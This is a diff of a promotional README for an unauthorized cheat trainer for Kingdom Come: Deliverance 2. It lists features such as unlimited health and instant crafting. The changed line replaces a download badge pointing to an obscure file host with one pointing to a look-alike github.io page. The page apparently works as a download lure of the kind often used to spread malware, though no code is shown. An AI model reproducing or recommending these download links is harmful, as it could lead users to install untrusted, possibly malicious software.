@@ -1,6 +1,6 @@
 **Kingdom Come: Deliverance 2 Trainer** is an unauthorized cheat tool designed for *Kingdom Come: Deliverance 2*, allowing players to gain unfair advantages by modifying the game's mechanics. The trainer typically offers features such as **unlimited health**, **unlimited resources**, **instant crafting**, and **enhanced combat abilities**. These cheats are aimed at making the game easier, bypassing difficult challenges and speeding up progression without having to earn rewards through regular gameplay.
 
-[![Download kingdom come:deliverance 2 trainer](https://img.shields.io/badge/Download-KingdomCOmeDeliverance2%20Trainer-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download kingdom come:deliverance 2 trainer](https://img.shields.io/badge/Download-KingdomCOmeDeliverance2%20Trainer-blueviolet)](https://kingdom-come-deliverance-2-trainer.github.io/.github/)
 
 **Key Features of Kingdom Come: Deliverance 2 Trainer:**
 - **Unlimited Health:** Keeps the player’s character invincible, preventing death in combat or other dangerous situations.
